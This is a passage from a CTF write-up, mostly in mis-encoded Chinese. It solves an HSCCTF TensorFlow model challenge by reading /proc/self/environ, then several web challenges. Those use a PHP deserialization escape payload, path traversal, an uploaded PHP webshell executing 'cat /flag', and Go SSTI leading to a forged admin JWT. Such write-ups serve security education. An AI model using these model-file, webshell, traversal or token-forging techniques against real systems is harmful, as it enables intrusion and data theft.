<code>[[1.0]]</code>ã€‚</p><p>è¿”å›å€¼ï¼šresult æ˜¯å­—å…¸ï¼Œè‡³å°‘æœ‰ä¸€ä¸ª prediction é”®ã€‚</p><p>æ ¸å¿ƒä»»åŠ¡ï¼šæ„é€ ä¸€ä¸ªæ¨¡å‹æ–‡ä»¶ï¼Œè®© <code>signature(tf.constant([[1.0]]))</code> çš„è¾“å‡ºç¬¦åˆæƒ³è¦çš„ç»“æœï¼ˆæ¯”å¦‚æ³„éœ² flagï¼‰ã€‚</p><p>åˆ—ç›®å½•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(tf.Module):</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tf.function(<span class="params">input_signature=[tf.TensorSpec(<span class="params">shape=[<span class="number">1</span>,<span class="number">1</span>], dtype=tf.float32</span>)]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">self, x</span>):</span><br><span class="line"></span><br><span class="line">        files = tf.io.matching_files(<span class="string">&quot;/*&quot;</span>)</span><br><span class="line">        joined = tf.strings.reduce_join(files, separator=<span class="string">b&quot;|&quot;</span>)</span><br><span class="line">        byte_vals = tf.strings.unicode_decode(joined, <span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;prediction&quot;</span>: tf.cast(tf.reshape(byte_vals, (<span class="number">1</span>, -<span class="number">1</span>)), tf.float32)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">model = MyModel()</span><br><span class="line"></span><br><span class="line">tf.saved_model.save(model, <span class="string">&quot;exported-model&quot;</span>, signatures=&#123;<span class="string">&quot;serve&quot;</span>: model.serve&#125;)</span><br></pre></td></tr></table></figure><p>è¯»æ–‡ä»¶ï¼ˆç¯å¢ƒå˜é‡ /proc/self/environï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyModel</span>(tf.Module):</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tf.function(<span class="params">input_signature=[tf.TensorSpec(<span class="params">shape=[<span class="number">1</span>,<span class="number">1</span>], dtype=tf.float32</span>)]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">self, x</span>):</span><br><span class="line">        text = tf.io.read_file(<span class="string">&quot;/proc/self/environ&quot;</span>)  <span class="comment"># ä¿®æ”¹ä¸ºçœŸå®è·¯å¾„</span></span><br><span class="line">        <span class="comment"># å°† flag è½¬æˆ bytes -&gt; int list</span></span><br><span class="line">        byte_vals = tf.strings.unicode_decode(text, <span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;prediction&quot;</span>: tf.cast(tf.reshape(byte_vals, (<span class="number">1</span>, -<span class="number">1</span>)), tf.float32)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">model = MyModel()</span><br><span class="line"></span><br><span class="line">tf.saved_model.save(</span><br><span class="line">    model,</span><br><span class="line">    export_dir=<span class="string">&quot;exported-model&quot;</span>,</span><br><span class="line">    signatures=&#123;<span class="string">&quot;serve&quot;</span>: model.serve&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœçš„è§£æï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">80.0</span>, <span class="number">89.0</span>, <span class="number">84.0</span>, <span class="number">72.0</span>, <span class="number">79.0</span>, <span class="number">78.0</span>, <span class="number">95.0</span>, <span class="number">83.0</span>, <span class="number">72.0</span>, <span class="number">65.0</span>, <span class="number">50.0</span>, <span class="number">53.0</span>, <span class="number">54.0</span>, <span class="number">61.0</span>, <span class="number">48.0</span>, <span class="number">55.0</span>, <span class="number">97.0</span>, <span class="number">98.0</span>, <span class="number">54.0</span>, <span class="number">57.0</span>, <span class="number">55.0</span>, <span class="number">52.0</span>, <span class="number">55.0</span>, <span class="number">52.0</span>, <span class="number">53.0</span>, <span class="number">57.0</span>, <span class="number">53.0</span>, <span class="number">101.0</span>, <span class="number">48.0</span>, <span class="number">54.0</span>, <span class="number">102.0</span>, <span class="number">48.0</span>, <span class="number">54.0</span>, <span class="number">54.0</span>, <span class="number">52.0</span>, <span class="number">55.0</span>, <span class="number">52.0</span>, <span class="number">49.0</span>, <span class="number">55.0</span>, <span class="number">100.0</span>, <span class="number">51.0</span>, <span class="number">99.0</span>, <span class="number">55.0</span>, <span class="number">102.0</span>, <span class="number">97.0</span>, <span class="number">57.0</span>, <span class="number">55.0</span>, <span class="number">100.0</span>, <span class="number">101.0</span>, <span class="number">100.0</span>, <span class="number">48.0</span>, <span class="number">55.0</span>, <span class="number">97.0</span>, <span class="number">102.0</span>, <span class="number">99.0</span>, <span class="number">49.0</span>, <span class="number">97.0</span>, <span class="number">55.0</span>, <span class="number">101.0</span>, <span class="number">52.0</span>, <span class="number">52.0</span>, <span class="number">53.0</span>, <span class="number">52.0</span>, <span class="number">99.0</span>, <span class="number">53.0</span>, <span class="number">54.0</span>, <span class="number">51.0</span>, <span class="number">57.0</span>, <span class="number">57.0</span>, <span class="number">49.0</span>, <span class="number">57.0</span>, <span class="number">98.0</span>, <span class="number">52.0</span>, <span class="number">54.0</span>, <span class="number">101.0</span>, <span class="number">97.0</span>, <span class="number">101.0</span>, <span class="number">97.0</span>, <span class="number">0.0</span>, <span class="number">72.0</span>, <span class="number">79.0</span>, <span class="number">83.0</span>, <span class="number">84.0</span>, <span class="number">78.0</span>, <span class="number">65.0</span>, <span class="number">77.0</span>, <span class="number">69.0</span>, <span class="number">61.0</span>, <span class="number">54.0</span>, <span class="number">50.0</span>, <span class="number">53.0</span>, <span class="number">102.0</span>, <span class="number">54.0</span>, <span class="number">50.0</span>, <span class="number">101.0</span>, <span class="number">100.0</span>, <span class="number">53.0</span>, <span class="number">55.0</span>, <span class="number">54.0</span>, <span class="number">101.0</span>, <span class="number">0.0</span>, <span class="number">80.0</span>, <span class="number">89.0</span>, <span class="number">84.0</span>, <span class="number">72.0</span>, <span class="number">79.0</span>, <span class="number">78.0</span>, <span class="number">95.0</span>, <span class="number">86.0</span>, <span class="number">69.0</span>, <span class="number">82.0</span>, <span class="number">83.0</span>, <span class="number">73.0</span>, <span class="number">79.0</span>, <span class="number">78.0</span>, <span class="number">61.0</span>, <span class="number">51.0</span>, <span class="number">46.0</span>, <span class="number">49.0</span>, <span class="number">50.0</span>, <span class="number">46.0</span>, <span class="number">49.0</span>, <span class="number">48.0</span>, <span class="number">0.0</span>, <span class="number">80.0</span>, <span class="number">87.0</span>, <span class="number">68.0</span>, <span class="number">61.0</span>, <span class="number">47.0</span>, <span class="number">97.0</span>, <span class="number">112.0</span>, <span class="number">112.0</span>, <span class="number">0.0</span>, <span class="number">72.0</span>, <span class="number">79.0</span>, <span class="number">77.0</span>, <span class="number">69.0</span>, <span class="number">61.0</span>, <span class="number">47.0</span>, <span class="number">114.0</span>, <span class="number">111.0</span>, <span class="number">111.0</span>, <span class="number">116.0</span>, <span class="number">0.0</span>, <span class="number">76.0</span>, <span class="number">65.0</span>, <span class="number">78.0</span>, <span class="number">71.0</span>, <span class="number">61.0</span>, <span class="number">67.0</span>, <span class="number">46.0</span>, <span class="number">85.0</span>, <span class="number">84.0</span>, <span class="number">70.0</span>, <span class="number">45.0</span>, <span class="number">56.0</span>, <span class="number">0.0</span>, <span class="number">71.0</span>, <span class="number">80.0</span>, <span class="number">71.0</span>, <span class="number">95.0</span>, <span class="number">75.0</span>, <span class="number">69.0</span>, <span class="number">89.0</span>, <span class="number">61.0</span>, <span class="number">55.0</span>, <span class="number">49.0</span>, <span class="number">54.0</span>, <span class="number">57.0</span>, <span class="number">54.0</span>, <span class="number">48.0</span>, <span class="number">53.0</span>, <span class="number">70.0</span>, <span class="number">54.0</span>, <span class="number">50.0</span>, <span class="number">67.0</span>, <span class="number">55.0</span>, <span class="number">53.0</span>, <span class="number">49.0</span>, <span class="number">51.0</span>, <span class="number">53.0</span>, <span class="number">54.0</span>, <span class="number">68.0</span>, <span class="number">48.0</span>, <span class="number">53.0</span>, <span class="number">52.0</span>, <span class="number">65.0</span>, <span class="number">50.0</span>, <span class="number">54.0</span>, <span class="number">65.0</span>, <span class="number">56.0</span>, <span class="number">50.0</span>, <span class="number">49.0</span>, <span class="number">69.0</span>, <span class="number">54.0</span>, <span class="number">56.0</span>, <span class="number">48.0</span>, <span class="number">69.0</span>, <span class="number">53.0</span>, <span class="number">70.0</span>, <span class="number">65.0</span>, <span class="number">54.0</span>, <span class="number">51.0</span>, <span class="number">48.0</span>, <span class="number">53.0</span>, <span class="number">0.0</span>, <span class="number">70.0</span>, <span class="number">76.0</span>, <span class="number">65.0</span>, <span class="number">71.0</span>, <span class="number">61.0</span>, <span class="number">72.0</span>, <span class="number">83.0</span>, <span class="number">67.0</span>, <span class="number">67.0</span>, <span class="number">84.0</span>, <span class="number">70.0</span>, <span class="number">123.0</span>, <span class="number">49.0</span>, <span class="number">100.0</span>, <span class="number">101.0</span>, <span class="number">54.0</span>, <span class="number">102.0</span>, <span class="number">102.0</span>, <span class="number">101.0</span>, <span class="number">102.0</span>, <span class="number">45.0</span>, <span class="number">98.0</span>, <span class="number">49.0</span>, <span class="number">56.0</span>, <span class="number">51.0</span>, <span class="number">45.0</span>, <span class="number">52.0</span>, <span class="number">57.0</span>, <span class="number">53.0</span>, <span class="number">56.0</span>, <span class="number">45.0</span>, <span class="number">97.0</span>, <span class="number">102.0</span>, <span class="number">53.0</span>, <span class="number">100.0</span>, <span class="number">45.0</span>, <span class="number">98.0</span>, <span class="number">54.0</span>, <span class="number">54.0</span>, <span class="number">55.0</span>, <span class="number">55.0</span>, <span class="number">56.0</span>, <span class="number">55.0</span>, <span class="number">101.0</span>, <span class="number">48.0</span>, <span class="number">102.0</span>, <span class="number">99.0</span>, <span class="number">99.0</span>, <span class="number">125.0</span>, <span class="number">0.0</span>, <span class="number">83.0</span>, <span class="number">72.0</span>, <span class="number">76.0</span>, <span class="number">86.0</span>, <span class="number">76.0</span>, <span class="number">61.0</span>, <span class="number">48.0</span>, <span class="number">0.0</span>, <span class="number">80.0</span>, <span class="number">65.0</span>, <span class="number">84.0</span>, <span class="number">72.0</span>, <span class="number">61.0</span>, <span class="number">47.0</span>, <span class="number">117.0</span>, <span class="number">115.0</span>, <span class="number">114.0</span>, <span class="number">47.0</span>, <span class="number">108.0</span>, <span class="number">111.0</span>, <span class="number">99.0</span>, <span class="number">97.0</span>, <span class="number">108.0</span>, <span class="number">47.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">58.0</span>, <span class="number">47.0</span>, <span class="number">117.0</span>, <span class="number">115.0</span>, <span class="number">114.0</span>, <span class="number">47.0</span>, <span class="number">108.0</span>, <span class="number">111.0</span>, <span class="number">99.0</span>, <span class="number">97.0</span>, <span class="number">108.0</span>, <span class="number">47.0</span>, <span class="number">115.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">58.0</span>, <span class="number">47.0</span>, <span class="number">117.0</span>, <span class="number">115.0</span>, <span class="number">114.0</span>, <span class="number">47.0</span>, <span class="number">108.0</span>, <span class="number">111.0</span>, <span class="number">99.0</span>, <span class="number">97.0</span>, <span class="number">108.0</span>, <span class="number">47.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">58.0</span>, <span class="number">47.0</span>, <span class="number">117.0</span>, <span class="number">115.0</span>, <span class="number">114.0</span>, <span class="number">47.0</span>, <span class="number">115.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">58.0</span>, <span class="number">47.0</span>, <span class="number">117.0</span>, <span class="number">115.0</span>, <span class="number">114.0</span>, <span class="number">47.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">58.0</span>, <span class="number">47.0</span>, <span class="number">115.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">58.0</span>, <span class="number">47.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">0.0</span>, <span class="number">95.0</span>, <span class="number">61.0</span>, <span class="number">47.0</span>, <span class="number">117.0</span>, <span class="number">115.0</span>, <span class="number">114.0</span>, <span class="number">47.0</span>, <span class="number">108.0</span>, <span class="number">111.0</span>, <span class="number">99.0</span>, <span class="number">97.0</span>, <span class="number">108.0</span>, <span class="number">47.0</span>, <span class="number">98.0</span>, <span class="number">105.0</span>, <span class="number">110.0</span>, <span class="number">47.0</span>, <span class="number">112.0</span>, <span class="number">121.0</span>, <span class="number">116.0</span>, <span class="number">104.0</span>, <span class="number">111.0</span>, <span class="number">110.0</span>, <span class="number">0.0</span>], dtype=np.int32).tolist()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> a]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¯å¢ƒå˜é‡ä¸­å†…å®¹ï¼š</span></span><br><span class="line"><span class="comment"># FLAG=HSCCTF&#123;1de6ffef-b183-4958-af5d-b667787e0fcc&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Baby-Cloud"><a href="#Baby-Cloud" class="headerlink" title="Baby Cloud"></a>Baby Cloud</h3><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚</p><p>æ„é€ æ™®é€šåºåˆ—åŒ–ç»“æœï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">race</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rainbow</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pinkie</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fail</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$rainbow</span>, <span class="variable">$pinkie</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rainbow = <span class="variable">$rainbow</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pinkie = <span class="variable">$pinkie</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rainbow</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="variable">$pinkie</span> = <span class="string">&#x27;awesome&quot;;s:4:&quot;fail&quot;;i:0;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_RACE</span> = <span class="keyword">new</span> <span class="title function_ invoke__">race</span>(<span class="variable">$rainbow</span>, <span class="variable">$pinkie</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_RACE</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:4:&quot;race&quot;:3:&#123;s:7:&quot;rainbow&quot;;s:3:&quot;aaa&quot;;s:6:&quot;pinkie&quot;;s:25:&quot;awesome&quot;;s:4:&quot;fail&quot;;i:0;&#125;&quot;;s:4:&quot;fail&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure><p>æ„é€ å¤šä¸ªawesomeï¼Œä½¿å¾—æ›¿æ¢ä¸ºawesomerçš„æ—¶å€™ï¼Œèƒ½è¢«å‰é¢çš„æ•°é‡åŒ…å«è¿›å»ï¼Œ7x+18=8xï¼Œæœ‰x=18ï¼Œå³18ä¸ªawesomeã€‚</p><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rainbow=wonderful&amp;pinkie=awesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesomeawesome&quot;;s:4:&quot;fail&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Horse"><a href="#Horse" class="headerlink" title="Horse"></a>Horse</h3><p>æ‰«å‡ºrobots.txtï¼Œè®¿é—®æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸è¦è®¿é—®ctfer_modeåƒä¸‡ä¸è¦</span><br><span class="line">ä¸è¦è®¿é—®/password/pass.liståƒä¸‡ä¸è¦</span><br></pre></td></tr></table></figure><p>è®¿é—®/password/pass.listï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test:11451419</span><br><span class="line">ctfers:æˆ‘å¿˜äº†å“ˆå“ˆ</span><br></pre></td></tr></table></figure><p>bpæŠ“åŒ…ï¼Œä½¿ç”¨å¼±å£ä»¤+ç›®å½•ç©¿è¶Šï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/change_mode.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>150.138.81.18:12137</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://150.138.81.18:12137</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://150.138.81.18:12137/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=7340142d44b097d47962e41d780bba91</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-awk">ctfers=ctfers&amp;ctfpass=<span class="number">12345678</span>&amp;ctfer_mode=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>flag</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Purple-Moon"><a href="#Purple-Moon" class="headerlink" title="Purple Moon"></a>Purple Moon</h3><p>æ‰“æ¡ä»¶ç«äº‰ï¼Œä¸¤ä¸ªrequeståŒæ—¶å‘åŒ…ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>150.138.81.18:13769</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>916</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://150.138.81.18:13769</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjQfbzI48Oa9esZqb</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://150.138.81.18:13769/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=7340142d44b097d47962e41d780bba91</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjQfbzI48Oa9esZqb</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjQfbzI48Oa9esZqb--</span></span><br></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/uploads/1.php?x=cat%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>150.138.81.18:13769</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=7340142d44b097d47962e41d780bba91</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Gogogo"><a href="#Gogogo" class="headerlink" title="Gogogo"></a>Gogogo</h3><p>æ³¨å†Œç™»å½•ï¼Œæ–°å»ºå·¥å•é¡µé¢ï¼Œå­˜åœ¨Go SSTIã€‚</p><p>ä½¿ç”¨ <code>&#123;&#123;.&#125;&#125;</code> æ³„éœ²å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=SLgFbnzQpmGts7vw</span><br></pre></td></tr></table></figure><p>ä¸ºjwtçš„secretï¼Œç„¶åjwtä¼ªé€ ï¼Œä¿®æ”¹roleä¸ºadminï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;exp&quot;: 1765058778,</span><br><span class="line">  &quot;iss&quot;: &quot;acme-support-prod&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;role&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;userid&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjUwNTg3NzgsImlzcyI6ImFjbWUtc3VwcG9ydC1wcm9kIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidXNlcmlkIjoxfQ.nho9gLcdO2K4afYOpOBuyeTsfsGY6LmWyF1wDT9ORjk</span><br></pre></td></tr></table></figure><p>æ”¹cookieçš„tokenåå˜ä¸ºadminï¼Œè¿›å…¥å·¥å•ç®¡ç†ï¼Œ#1003 - é«˜ä¼˜å…ˆçº§æœºå¯†å·¥å•ï¼Œæ‰¾åˆ°flagã€‚</p><p>â€‹</p><h3 id="Time-capsule"><a href="#Time-capsule" class="headerlink" title="Time capsule"></a>Time capsule</h3><blockquote><p>A secure time capsule system can only be unlocked at a specific time, but is it really safe?</p></blockquote><p>ç›´æ¥è®¿é—® /FLAG å³å¯ã€‚</p><p>â€‹</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Ancient"><a href="#Ancient" class="headerlink" title="Ancient"></a>Ancient</h3><blockquote><p>Real sign-in</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 